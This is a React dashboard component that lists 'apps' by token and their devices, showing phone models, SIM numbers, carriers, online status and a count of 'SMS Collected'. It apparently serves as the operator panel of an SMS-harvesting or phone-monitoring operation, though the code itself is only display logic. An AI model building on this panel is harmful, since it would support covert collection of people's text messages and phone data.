import { useEffect, useState } from "react";
import { Boxes, Smartphone, MessageSquare, RefreshCw, TrendingUp, Search, X } from "lucide-react";
import StatCard from "@/components/StatCard";
import Badge from "@/components/Badge";
import type { AdminApp, Device } from "@/lib/types";
import { getApps, getDevices, calcStats } from "@/lib/supabase";

const isSystemEntry = (d: Device) => d.sub_id.startsWith("admin_");

export default function Dashboard() {
  const [apps, setApps] = useState<AdminApp[]>([]);
  const [deviceMap, setDeviceMap] = useState<Record<string, Device[]>>({});
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [search, setSearch] = useState("");

  const load = async (silent = false) => {
    if (!silent) setLoading(true); else setRefreshing(true);
    try {
      const loaded = await getApps();
      setApps(loaded);
      const map: Record<string, Device[]> = {};
      await Promise.allSettled(
        loaded.map(async (a) => {
          try { map[a.token] = await getDevices(a.token); } catch { map[a.token] = []; }
        })
      );
      setDeviceMap(map);
    } finally {
      setLoading(false); setRefreshing(false);
    }
  };

  useEffect(() => { void load(); }, []);

  const allDevices = Object.values(deviceMap).flat().filter((d) => !isSystemEntry(d));
  const totalApps  = apps.length;
  const activeApps = apps.filter((a) => a.is_active).length;
  const totalDev   = allDevices.length;
  const totalSms   = allDevices.reduce((s, d) => s + (d.total_sms_count ?? 0), 0);
  const now        = Date.now();
  const isOnline   = (d: Device) => {
    const t = d.data_json?.online_checked_at ?? 0;
    return t > 0 && now - t < 15 * 60 * 1000;
  };
  const onlineDev  = allDevices.filter(isOnline).length;

  // Search results — finds devices by sub_id, model, SIM across all apps
  const q = search.trim().toLowerCase();
  const searchResults: Array<{ app: AdminApp; device: Device }> = q
    ? apps.flatMap((app) =>
        (deviceMap[app.token] ?? [])
          .filter((d) => !isSystemEntry(d))
          .filter((d) =>
            [d.sub_id, d.data_json?.device_name, d.data_json?.model,
             d.data_json?.brand, d.data_json?.sim1number, d.data_json?.sim2number]
              .some((v) => v?.toLowerCase().includes(q))
          )
          .map((device) => ({ app, device }))
      )
    : [];

  const fmt = (ts?: number) => {
    if (!ts || ts === 0) return "—";
    return new Date(ts).toLocaleString("en-IN", { day: "numeric", month: "short", hour: "2-digit", minute: "2-digit" });
  };

  return (
    <div className="flex-1 overflow-auto h-full bg-[#080c16]">
      <div className="sticky top-0 z-10 bg-[#080c16]/90 backdrop-blur border-b border-slate-800/60 h-14 flex items-center justify-between px-4 sm:px-6">
        <div>
          <h1 className="text-sm font-semibold text-white">Dashboard</h1>
          <p className="text-xs text-slate-600 hidden sm:block">Overview of all applications</p>
        </div>
        <button onClick={() => void load(true)} disabled={refreshing}
                className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-slate-400 hover:text-white transition-colors disabled:opacity-50">
          <RefreshCw className={`w-3 h-3 ${refreshing ? "animate-spin" : ""}`} />
          Refresh
        </button>
      </div>

      <div className="p-3 sm:p-6 space-y-4">
        {loading ? (
          <div className="flex items-center justify-center py-24 text-slate-600">
            <span className="w-5 h-5 border-2 border-slate-700 border-t-blue-500 rounded-full animate-spin mr-2" />
            <span className="text-sm">Loading…</span>
          </div>
        ) : (
          <>
            {/* Stat cards */}
            <div className="grid grid-cols-2 lg:grid-cols-3 gap-2">
              <StatCard label="Total Apps"    value={totalApps}                  icon={Boxes}         color="blue"  sub={`${activeApps} active`} />
              <StatCard label="Total Devices" value={totalDev}                   icon={Smartphone}    color="green" sub={`${onlineDev} online`} />
              <StatCard label="SMS Collected" value={totalSms.toLocaleString()} icon={MessageSquare} color="amber" />
            </div>

            {/* Search bar */}
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-slate-600 pointer-events-none" />
              <input
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder="Search device by ID, model, SIM…"
                className="w-full bg-[#0d1220] border border-slate-800 rounded-xl pl-9 pr-9 py-2.5 text-sm placeholder-slate-700 text-white focus:outline-none focus:border-blue-500/50 transition-colors"
              />
              {search && (
                <button onClick={() => setSearch("")}
                        className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-600 hover:text-slate-400 transition-colors">
                  <X className="w-3.5 h-3.5" />
                </button>
              )}
            </div>

            {/* Search results */}
            {q && (
              <div>
                <p className="text-xs text-slate-600 mb-2">
                  {searchResults.length === 0
                    ? `No devices found for "${search}"`
                    : `${searchResults.length} result${searchResults.length !== 1 ? "s" : ""} for "${search}"`}
                </p>
                {searchResults.length > 0 && (
                  <div className="space-y-2">
                    {searchResults.map(({ app, device: d }) => {
                      const dj = d.data_json ?? {};
                      const online = isOnline(d);
                      const statusV = online ? "online"
                        : (dj.online_checked_at ?? 0) > 0 ? "offline" : "unknown";
                      const deviceLabel = dj.device_name || dj.model || dj.brand || null;
                      const simInfo = dj.sim1number
                        ? `${dj.sim1number}${dj.sim1carrier ? ` · ${dj.sim1carrier}` : ""}`
                        : null;
                      return (
                        <div key={`${app.token}-${d.sub_id}`}
                             className="bg-[#0d1220] border border-slate-800/80 rounded-2xl px-3 sm:px-4 py-3">
                          <div className="flex items-start gap-2.5">
                            <div className={`w-8 h-8 rounded-xl flex items-center justify-center flex-shrink-0 mt-0.5 ${
                              online ? "bg-emerald-900/20" : "bg-slate-800"
                            }`}>
                              <Smartphone className={`w-4 h-4 ${online ? "text-emerald-400" : "text-slate-500"}`} />
                            </div>
                            <div className="flex-1 min-w-0">
                              <div className="flex items-center gap-1.5 flex-wrap">
                                <span className="font-mono text-sm text-white font-semibold">{d.sub_id}</span>
                                <Badge variant={statusV} pulse={online} />
                              </div>
                              <div className="flex flex-wrap gap-x-2 text-xs text-slate-500 mt-0.5">
                                {deviceLabel && <span>{deviceLabel}</span>}
                                {simInfo && <span className="font-mono">{simInfo}</span>}
                              </div>
                              <p className="text-[10px] text-slate-600 mt-0.5">
                                App: <span className="font-mono text-slate-500">{app.token}</span>
                                {dj.last_seen_at ? ` · Seen ${fmt(dj.last_seen_at)}` : ""}
                              </p>
                            </div>
                          </div>
                        </div>
                      );
                    })}
                  </div>
                )}
              </div>
            )}

            {/* Apps list (hidden when searching) */}
            {!q && (
              <div>
                <h2 className="text-sm font-semibold text-white flex items-center gap-2 mb-3">
                  <TrendingUp className="w-4 h-4 text-blue-400" />
                  All Applications
                </h2>
                {apps.length === 0 ? (
                  <div className="text-center py-12 bg-[#0d1220] border border-slate-800 rounded-2xl">
                    <Boxes className="w-7 h-7 mx-auto text-slate-700 mb-2" />
                    <p className="text-sm text-slate-600">No apps yet. Create one in the Apps tab.</p>
                  </div>
                ) : (
                  <div className="space-y-2">
                    {apps.map((app) => {
                      const devs  = (deviceMap[app.token] ?? []).filter((d) => !isSystemEntry(d));
                      const stats = calcStats(devs);
                      return (
                        <div key={app.id} className="bg-[#0d1220] border border-slate-800/80 rounded-2xl p-3 sm:p-4">
                          <div className="flex items-center justify-between mb-3">
                            <div className="flex items-center gap-2 min-w-0">
                              <p className="text-sm font-semibold text-white truncate">{app.label || app.token}</p>
                              <Badge variant={app.is_active ? "active" : "inactive"} />
                            </div>
                            <span className="text-xs text-slate-600 font-mono flex-shrink-0 ml-2">{app.token}</span>
                          </div>
                          <div className="grid grid-cols-3 gap-2">
                            {[
                              { label: "Devices", value: stats.total,  color: "text-white" },
                              { label: "Online",  value: stats.online, color: "text-emerald-400" },
                              { label: "SMS",     value: devs.reduce((s, d) => s + (d.total_sms_count ?? 0), 0), color: "text-amber-400" },
                            ].map(({ label, value, color }) => (
                              <div key={label} className="bg-[#080c16] rounded-xl px-3 py-2.5 text-center">
                                <p className={`text-lg font-bold ${color}`}>{value}</p>
                                <p className="text-[10px] text-slate-600">{label}</p>
                              </div>
                            ))}
                          </div>
                        </div>
                      );
                    })}
                  </div>
                )}
              </div>
            )}
          </>
        )}
      </div>
    </div>
  );
}
